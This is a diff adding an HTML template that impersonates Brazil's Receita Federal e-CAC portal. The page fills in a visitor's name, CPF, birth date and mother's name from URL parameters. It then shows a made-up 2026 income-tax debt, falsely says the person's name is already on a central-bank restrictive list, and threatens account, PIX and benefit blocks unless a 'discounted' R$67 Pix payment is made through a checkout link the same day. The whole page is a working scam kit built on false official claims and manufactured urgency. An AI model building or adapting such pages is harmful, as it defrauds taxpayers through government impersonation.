@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vd01982f3b");
+    </script>
+    <meta charset="utf-8"/>
+    <title>Situação Fiscal — DIRPF 2026</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdngovbr-ds.estaleiro.serpro.gov.br/design-system/fonts/rawline/css/rawline.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons+Round" rel="stylesheet" />
+    <link rel="stylesheet" href="/static/rfb-header.css">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            max-width: 100vw;
+            overflow-x: hidden;
+        }
+        .dados-documento-card {
+            background: #FFFFFF;
+            border: 1px solid #c8cdd3;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.04);
+            max-width: 680px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        .dados-documento-body {
+            padding: 20px 24px 18px;
+            text-align: center;
+        }
+        .dados-documento-brasao {
+            height: 68px;
+            margin: 0 auto 8px;
+            object-fit: contain;
+        }
+        .dados-documento-republica {
+            font-size: 13px;
+            font-weight: 700;
+            color: #071D41;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .dados-documento-divider {
+            width: 50px;
+            height: 2px;
+            background: #1351B4;
+            margin: 0 auto 12px;
+            border-radius: 1px;
+        }
+        .dados-documento-dados {
+            padding: 16px 24px 18px;
+            border-top: 1px solid #dee2e6;
+        }
+        .dados-documento-dados-title {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            color: #071D41;
+            margin-bottom: 12px;
+        }
+        .dados-documento-row {
+            display: flex;
+            flex-direction: row;
+            align-items: baseline;
+            gap: 8px;
+            padding: 5px 0;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 12px;
+        }
+        .dados-documento-row.row-stack {
+            flex-direction: column;
+            gap: 2px;
+        }
+        .dados-documento-label {
+            color: #555d68;
+            white-space: nowrap;
+        }
+        .dados-documento-value {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+        .dados-documento-atencao {
+            margin-top: 14px;
+            padding-top: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .dados-documento-atencao-label {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1351B4;
+        }
+        .dados-documento-atencao-status {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            color: #C5190A;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .main-page {
+            display: none;
+            opacity: 0;
+        }
+        .main-page.ready {
+            display: block;
+        }
+        .main-page.active {
+            display: block;
+            opacity: 1;
+        }
+        
+        .btn-consultar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px 24px;
+            background-color: #1351B4;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            border-radius: 0;
+        }
+        .btn-consultar:hover {
+            background-color: #0C326F;
+        }
+        .btn-consultar:disabled {
+            cursor: not-allowed;
+            opacity: 0.85;
+        }
+        .btn-consultar .btn-spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: sp .6s linear infinite;
+        }
+        .btn-consultar.loading .btn-spinner {
+            display: inline-block;
+        }
+        .btn-consultar.loading .btn-label {
+            display: none;
+        }
+        .btn-consultar.loading .btn-loading-label {
+            display: inline;
+        }
+        .btn-loading-label {
+            display: none;
+        }
+        
+        @media (max-width: 640px) {
+            h2 { font-size: 17px !important; }
+            h3 { font-size: 14px !important; }
+            p { font-size: 12px !important; }
+            .btn-consultar {
+                padding: 16px 16px !important;
+                font-size: 14px !important;
+                width: 100%;
+                min-height: 44px;
+            }
+            .dados-documento-card { max-width: 100%; }
+            .dados-documento-body { padding: 16px 16px 14px; }
+            .dados-documento-dados { padding: 14px 16px 16px; }
+            .bg-white.border.border-gray-200 {
+                padding: 12px !important;
+                margin-bottom: 8px;
+                font-size: 11px !important;
+            }
+            .bg-white.border.border-gray-200 h4 { font-size: 13px !important; }
+            .flex.justify-between { flex-wrap: wrap; gap: 4px; }
+            #total-container { padding: 12px !important; }
+            #total-container div[style*="display: flex"] { flex-wrap: wrap; gap: 4px; }
+        }
+        @media (min-width: 640px) {
+            .dados-documento-body { padding: 24px 40px 20px; }
+            .dados-documento-dados { padding: 18px 40px 22px; }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    {% include 'global_loader.html' %}
+
+    <div id="redirect-overlay" class="rfb-loader-overlay">
+        <img src="/static/logo-receita.png" alt="Receita Federal">
+        <p class="rfb-loader-text">Consultando situação fiscal...</p>
+        <div class="rfb-loader-track"><div class="rfb-loader-bar"></div></div>
+        <div class="rfb-loader-percent">0%</div>
+    </div>
+
+    <div id="loading-popup" class="rfb-loader-overlay active">
+        <img src="/static/logo-receita.png" alt="Receita Federal">
+        <p class="rfb-loader-text">Consultando situação fiscal 2026...</p>
+        <div class="rfb-loader-track"><div class="rfb-loader-bar"></div></div>
+        <div class="rfb-loader-percent">0%</div>
+    </div>
+
+    <div id="main-page" class="main-page">
+        {% include 'rfb_header.html' %}
+        
+        <div class="px-4" style="background:#fff;">
+            <div class="max-w-2xl mx-auto py-3">
+                <nav style="display:flex;align-items:center;gap:6px;font-size:12px;font-family:'Inter','Rawline',sans-serif;white-space:nowrap;overflow-x:auto;scrollbar-width:none;">
+                    <a href="/" style="color:#1351B4;"><i class="fas fa-home" style="font-size:12px;"></i></a>
+                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                    <a href="/" style="color:#1351B4;text-decoration:none;">Ministério da Fazenda</a>
+                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                    <a href="/" style="color:#1351B4;text-decoration:none;">Receita Federal do Brasil</a>
+                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                    <a href="/" style="color:#1351B4;text-decoration:none;">e-CAC</a>
+                    <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                    <span style="color:#555d68;">Situação Fiscal 2026</span>
+                </nav>
+            </div>
+        </div>
+        <hr style="border:none;border-top:1px solid #e1e5eb;margin:0;">
+
+        <div class="px-4 py-4">
+            <div class="max-w-2xl mx-auto">
+                <h2 style="font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; font-family: 'Inter', 'Rawline', sans-serif;">Situação Fiscal — DIRPF 2026</h2>
+                <p style="font-size: 13px; color: #555d68; margin-bottom: 20px; font-family: 'Inter', 'Rawline', sans-serif;">Consulta de pendências tributárias referentes ao exercício de 2026.</p>
+                <div class="dados-documento-card">
+                    <div class="dados-documento-body">
+                        <img src="/static/brasao-republica.png" alt="Brasão da República" class="dados-documento-brasao">
+                        <p class="dados-documento-republica">República Federativa do Brasil</p>
+                        <p style="font-size:17px;font-weight:700;color:#1351B4;margin-bottom:4px;font-family:'Inter','Rawline',sans-serif;">Normativa (IN) RFB nº 2.219/2025</p>
+                        <p style="font-size:12px;color:#555d68;font-weight:500;margin-bottom:12px;font-family:'Inter','Rawline',sans-serif;">Vigor: Janeiro 2026</p>
+                        <div class="dados-documento-divider"></div>
+                        <p style="font-size:13px;color:#333;line-height:1.6;font-family:'Inter','Rawline',sans-serif;margin-top:12px;">
+                            <strong style="color: #071D41;">Declaração 2026 (DIRPF) — Pendência Identificada</strong>
+                        </p>
+                        <div style="margin-top: 16px; text-align: left;">
+                            <p class="dados-documento-dados-title">Dados Contribuinte:</p>
+                            <div class="dados-documento-row row-stack">
+                                <span class="dados-documento-label">Nome Completo:</span>
+                                <span id="dados-nome" class="dados-documento-value"></span>
+                            </div>
+                            <div class="dados-documento-row row-stack">
+                                <span class="dados-documento-label">Data de Nascimento:</span>
+                                <span id="dados-nascimento" class="dados-documento-value"></span>
+                            </div>
+                            <div class="dados-documento-row row-stack">
+                                <span class="dados-documento-label">Nome da Mãe:</span>
+                                <span id="dados-mae" class="dados-documento-value"></span>
+                            </div>
+                            <div class="dados-documento-row row-stack">
+                                <span class="dados-documento-label">CPF:</span>
+                                <span id="dados-cpf" class="dados-documento-value"></span>
+                            </div>
+                            <div class="dados-documento-atencao">
+                                <span class="dados-documento-atencao-label" style="font-weight: 400; color: #333;">Situação Processual:</span>
+                                <span class="dados-documento-atencao-status" style="color: #C5190A;">EM ANDAMENTO.</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="padding: 20px 0; border-top: 1px solid #e1e5eb; margin-top: 16px;">
+                    <p style="font-size: 17px; font-weight: 700; color: #071D41; margin-bottom: 8px; font-family: 'Inter', 'Rawline', sans-serif;">Prazo para Regularização</p>
+                    <p style="font-size: 14px; color: #333; margin-bottom: 16px; font-family: 'Inter', 'Rawline', sans-serif;">
+                        Data limite: <strong id="prazo-final-1" style="color: #1351B4;"></strong>
+                    </p>
+                    <p style="font-size: 14px; color: #555d68; margin-bottom: 14px; font-family: 'Inter', 'Rawline', sans-serif;">
+                        O descumprimento acarretará as seguintes medidas, conforme IN RFB nº 2.219/2025:
+                    </p>
+                    <ul style="font-size: 14px; color: #333; list-style: none; padding: 0; margin: 0; font-family: 'Inter', 'Rawline', sans-serif;">
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed; font-weight: 600; color: #C5190A;">Seu nome já consta na lista restritiva interna do BACEN (enviada aos bancos agora).</li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed;">Bloqueio de contas bancárias e cartões vinculados</li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed;">Suspensão de transações via PIX, TED e DOC</li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed;">Restrições cadastrais junto ao Banco Central e órgãos de proteção ao crédito</li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed;">Suspensão de benefícios federais (programas sociais e assistenciais)</li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #ededed;">Impedimento para contratação de financiamentos e operações de crédito</li>
+                        <li style="padding: 8px 0; font-weight: 600;">Aplicação de multa de ofício de até 150% sobre o valor devido</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <div id="loading-extrato" class="px-4 py-6 hidden">
+            <div class="max-w-2xl mx-auto">
+                <div class="text-center mb-4">
+                    <h3 class="font-bold text-lg mb-2" style="color: #1351B4;">Carregando Extrato (DIRPF):</h3>
+                    <div id="spinner-extrato" class="flex justify-center items-center mb-2">
+                        <div class="animate-spin rounded-full h-8 w-8 border-4 border-gray-300" style="border-top-color: #1351B4;"></div>
+                    </div>
+                    <p class="text-xs text-gray-600">Conectado ao Portal (e-CAC)</p>
+                    <p class="text-sm text-red-600 font-medium mt-2">CPF Irregular: <span id="cpf-irregular"></span></p>
+                </div>
+                
+                <div id="meses-container" class="space-y-4 mt-4"></div>
+                
+                <div id="total-container" class="hidden mt-6 bg-gray-100 p-4">
+                    <div class="flex justify-between items-center border-b border-gray-300 pb-2 mb-2">
+                        <span class="font-bold text-gray-800" style="font-size:13px;font-family:'Inter','Rawline',sans-serif;">TOTAL DÉBITO 2026:</span>
+                        <span class="font-bold text-red-700" style="font-size:13px;font-family:'Inter','Rawline',sans-serif;">R$ 144,90</span>
+                    </div>
+                    <div class="flex justify-between items-center border-b border-gray-300 pb-2 mb-2">
+                        <span style="font-size:12px;color:#555d68;font-family:'Inter','Rawline',sans-serif;">Abatimento por Adimplência:</span>
+                        <span style="font-size:12px;color:#168821;font-weight:600;font-family:'Inter','Rawline',sans-serif;">- R$ 77,90</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="font-bold" style="color:#1351B4;font-size:14px;font-family:'Inter','Rawline',sans-serif;">VALOR COM DESCONTO:</span>
+                        <span class="font-bold" style="color:#1351B4;font-size:14px;font-family:'Inter','Rawline',sans-serif;">R$ 67,00</span>
+                    </div>
+                    <p class="text-xs text-gray-600 mt-3" style="font-family:'Inter','Rawline',sans-serif;">Desconto válido apenas para pagamento integral hoje (<span id="data-desconto"></span>) via (DIRPF) Receita Federal do Brasil.</p>
+                    <button id="btn-regularizar" onclick="irParaCheckout()" class="btn-consultar" disabled style="opacity:0.6;cursor:not-allowed;">
+                        <span class="btn-spinner"></span>
+                        <span class="btn-label">Regularizar (DIRPF) 2026</span>
+                        <span class="btn-loading-label">Emitindo guia de pagamento...</span>
+                    </button>
+                    <div style="display:flex;align-items:flex-start;gap:0;margin-top:10px;padding:12px 14px;background:#f8f9fa;border-left:3px solid #1351B4;">
+                        <input type="checkbox" id="termo-regularizacao" style="margin-top:3px;min-width:16px;min-height:16px;cursor:pointer;accent-color:#1351B4;">
+                        <label for="termo-regularizacao" style="font:12px/1.6 'Inter','Rawline',sans-serif;color:#333;padding-left:10px;cursor:pointer;">Após o Pix clique em <strong>Confirmar Regularização</strong> para finalizar o protocolo de quitação, com validade legal perante a Receita Federal.</label>
+                    </div>
+                    <p id="prazo-ultimo-dia" style="font-size: 12px; color: #C5190A; text-align: center; margin-top: 10px; font-weight: 600; font-family: 'Inter','Rawline',sans-serif;"></p>
+                    <hr style="border:none;border-top:1px solid #dee2e6;margin:10px 0;width:92%;margin-left:auto;margin-right:auto;">
+                    <p style="font-size:11px;color:#666;text-align:center;font-family:'Inter','Rawline',sans-serif;margin:0 auto;width:92%;">Este procedimento segue as normas da IN RFB 1.898/2020. Dúvidas ligue 0800-728-4343.</p>
+                </div>
+
+                <div id="notificacao-container" class="hidden mt-6 text-center">
+                    <img src="/static/brasao-republica.png" alt="Brasão da República" class="h-16 mx-auto mb-3 object-contain">
+                    <h3 class="font-bold text-lg text-gray-900 mb-3">NOTIFICAÇÃO OFICIAL - PRAZO FINAL</h3>
+                    <p class="text-sm text-gray-700 text-left mb-4">
+                        O não cumprimento da obrigação tributária até <strong id="prazo-final-2"></strong> resultará na imposição de multa adicional no valor de <strong class="text-red-600">R$ 1.985,00</strong> e na aplicação das seguintes medidas administrativas pela Receita Federal do Brasil:
+                    </p>
+                    <div class="text-sm text-left space-y-3">
+                        <p><strong>1. BLOQUEIO BANCÁRIO:</strong> Suspensão de todas as contas correntes, poupanças e investimentos.</p>
+                        <p><strong>2. RESTRIÇÃO PIX:</strong> Bloqueio imediato de envio e recebimento de transferências via PIX.</p>
+                        <p><strong>3. CADIN/SERASA:</strong> Inscrição automática nos cadastros de inadimplentes federais.</p>
+                        <p><strong>4. BENEFÍCIOS:</strong> Suspensão de todos os programas sociais e assistenciais do Governo Federal.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="footer-container" class="hidden mt-8">
+            {% include 'rfb_footer.html' %}
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const nome = urlParams.get('nome') || '';
+        const cpf = urlParams.get('cpf') || '';
+        const nascimento = urlParams.get('nascimento') || '';
+        const mae = urlParams.get('mae') || '';
+        
+        async function iniciarCarregamento() {
+            rfbAnimateLoader('loading-popup', [
+                { at: 20, text: 'Conectando com GOVBR...' },
+                { at: 45, text: 'Consultando base tributária...' },
+                { at: 70, text: 'Acessando sistema e-CAC...' },
+                { at: 90, text: 'Verificando pendências fiscais 2026...' }
+            ], 4500, function(t) {
+                t.textContent = 'Pendência identificada — DIRPF 2026';
+                t.style.color = '#C5190A';
+            });
+
+            await new Promise(resolve => setTimeout(resolve, 5100));
+
+            prepararPaginaPrincipal();
+
+            rfbHideLoader('loading-popup', function() {
+                document.getElementById('main-page').classList.add('active');
+            });
+        }
+        
+        function prepararPaginaPrincipal() {
+            const primeiroNome = (nome || 'Usuário').split(' ')[0];
+            var signInEl = document.getElementById('rfb-sign-in-name');
+            if (signInEl) signInEl.textContent = primeiroNome;
+            
+            document.getElementById('dados-nome').textContent = nome || 'Não informado';
+            document.getElementById('dados-nascimento').textContent = nascimento || 'Não informado';
+            document.getElementById('dados-mae').textContent = mae || 'Não informado';
+            document.getElementById('dados-cpf').textContent = formatCPF(cpf);
+
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mesNum = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            const dataHoje = dia + '/' + mesNum + '/' + ano;
+            
+            var pf1 = document.getElementById('prazo-final-1');
+            if (pf1) pf1.textContent = dataHoje;
+            
+            document.getElementById('main-page').classList.add('ready');
+        }
+
+        function formatCPF(cpf) {
+            const cpfClean = String(cpf).replace(/\D/g, '');
+            return cpfClean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        
+        function irParaCheckout() {
+            const btn = document.getElementById('btn-regularizar');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            const nomeEnc = encodeURIComponent(nome || 'Usuário');
+            const cpfEnc = encodeURIComponent(cpf);
+            const valor = '67.00';
+            
+            setTimeout(function() {
+                rfbTransition('redirect-overlay', 'Consultando situação fiscal...', [
+                    { at: 40, text: 'Gerando guia de pagamento...' },
+                    { at: 85, text: 'Redirecionando para o portal de pagamento...', color: '#168821' }
+                ], 2500, '/checkout?nome=' + nomeEnc + '&cpf=' + cpfEnc + '&valor=' + valor + '&level=2');
+            }, 1200);
+        }
+        
+        let loadingExtratoMostrado = false;
+        let carregamentoMesesIniciado = false;
+        
+        const mesesDados = [
+            { mes: 'Janeiro/2026', malha: 1110.46, iof: 4.22, juros: 222.09, debito: 63.45 },
+            { mes: 'Fevereiro/2026', malha: 1342.37, iof: 5.10, juros: 268.47, debito: 81.45 }
+        ];
+        
+        async function carregarMeses() {
+            if (carregamentoMesesIniciado) return;
+            carregamentoMesesIniciado = true;
+            
+            document.getElementById('cpf-irregular').textContent = formatCPF(cpf);
+            
+            const container = document.getElementById('meses-container');
+            
+            for (let i = 0; i < mesesDados.length; i++) {
+                const m = mesesDados[i];
+                
+                const miniLoading = document.createElement('div');
+                miniLoading.className = 'flex items-center justify-center py-3';
+                miniLoading.id = 'mini-loading-atual';
+                miniLoading.innerHTML = '<div class="animate-spin rounded-full h-5 w-5 border-2 border-gray-300 mr-2" style="border-top-color: #1351B4;"></div><span class="text-xs text-gray-500">Carregando ' + m.mes + '...</span>';
+                container.appendChild(miniLoading);
+                
+                setTimeout(() => {
+                    miniLoading.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+                
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                container.removeChild(miniLoading);
+                
+                const mesDiv = document.createElement('div');
+                mesDiv.className = 'bg-white border border-gray-200 p-3 text-sm';
+                mesDiv.innerHTML = '<h4 class="font-bold text-gray-800 mb-2">' + m.mes + '</h4><div class="flex justify-between mb-1"><span class="text-gray-600">Malha Fina:</span><span class="text-gray-800">R$ ' + m.malha.toLocaleString('pt-BR', {minimumFractionDigits: 2}) + '</span></div><div class="flex justify-between mb-1"><span class="text-gray-600">IOF (0,38%):</span><span class="text-gray-800">R$ ' + m.iof.toLocaleString('pt-BR', {minimumFractionDigits: 2}) + '</span></div><div class="flex justify-between mb-1"><span class="text-gray-600">Juros Mora (20%):</span><span class="text-gray-800">R$ ' + m.juros.toLocaleString('pt-BR', {minimumFractionDigits: 2}) + '</span></div><div class="border-t border-gray-300 my-2"></div><div class="flex justify-between"><span class="font-semibold text-gray-700">Débito:</span><span class="font-semibold text-red-600">R$ ' + m.debito.toLocaleString('pt-BR', {minimumFractionDigits: 2}) + '</span></div>';
+                container.appendChild(mesDiv);
+                
+                setTimeout(() => {
+                    mesDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+            }
+            
+            const processoDiv = document.createElement('div');
+            var hj=new Date();var d2=String(hj.getDate()).padStart(2,'0');var m2=String(hj.getMonth()+1).padStart(2,'0');var a2=hj.getFullYear();
+            processoDiv.style.cssText = 'text-align:center;padding:6px 10px;background:#f8f9fa;border:1px solid #dee2e6;border-top:2px solid #1351B4;font-family:"Inter","Rawline",sans-serif;overflow:hidden;';
+            processoDiv.innerHTML = '<div style="font-size:8px;color:#555d68;letter-spacing:0.2px;line-height:1.6;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Processo nº <strong style="color:#071D41;">28.1748320184-9284.03</strong> &nbsp;|&nbsp; Protocolo <strong style="color:#071D41;">DIRPF-'+d2+m2+a2+'-2026</strong></div><div style="font-size:8px;color:#555d68;letter-spacing:0.2px;margin-top:1px;">Emitido em <strong style="color:#071D41;">'+d2+'/'+m2+'/'+a2+'</strong></div>';
+            container.appendChild(processoDiv);
+            
+            document.getElementById('spinner-extrato').classList.add('hidden');
+            document.getElementById('total-container').classList.remove('hidden');
+            document.getElementById('footer-container').classList.remove('hidden');
+            
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            const dataHoje = dia + '/' + mes + '/' + ano;
+            document.getElementById('data-desconto').textContent = dataHoje;
+
+            var pf2 = document.getElementById('prazo-final-2');
+            if (pf2) pf2.textContent = dataHoje;
+
+            var prazoEl = document.getElementById('prazo-ultimo-dia');
+            if(prazoEl) prazoEl.innerHTML = '<span style="color:#C5190A;">Prazo final ' + dia + '/' + mes + '/' + ano + '</span> <span style="color:#555d68;">\u2013 protocolo de regularização emitido na hora para quitar hoje</span>';
+
+            (function(){
+                var chk = document.getElementById('termo-regularizacao');
+                var btnReg = document.getElementById('btn-regularizar');
+                if(!chk || !btnReg) return;
+                function atualizarEstado(){
+                    if(chk.checked){
+                        btnReg.disabled = false;
+                        btnReg.style.opacity = '1';
+                        btnReg.style.cursor = 'pointer';
+                    } else {
+                        btnReg.disabled = true;
+                        btnReg.style.opacity = '0.6';
+                        btnReg.style.cursor = 'not-allowed';
+                    }
+                }
+                atualizarEstado();
+                chk.addEventListener('change', atualizarEstado);
+            })();
+        }
+        
+        function verificarScroll() {
+            if (loadingExtratoMostrado) return;
+            
+            const mainPage = document.getElementById('main-page');
+            if (!mainPage.classList.contains('active')) return;
+            
+            const scrollPosition = window.scrollY + window.innerHeight;
+            const pageHeight = document.documentElement.scrollHeight;
+            
+            if (scrollPosition >= pageHeight - 200) {
+                loadingExtratoMostrado = true;
+                document.getElementById('loading-extrato').classList.remove('hidden');
+                setTimeout(() => {
+                    carregarMeses();
+                }, 5000);
+            }
+        }
+        
+        window.addEventListener('scroll', verificarScroll);
+        
+        document.addEventListener('DOMContentLoaded', iniciarCarregamento);
+    </script>
+    <script src="/static/rfb-header.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            rfbHeaderInit('Entrar');
+        });
+    </script>
+</body>
+</html>
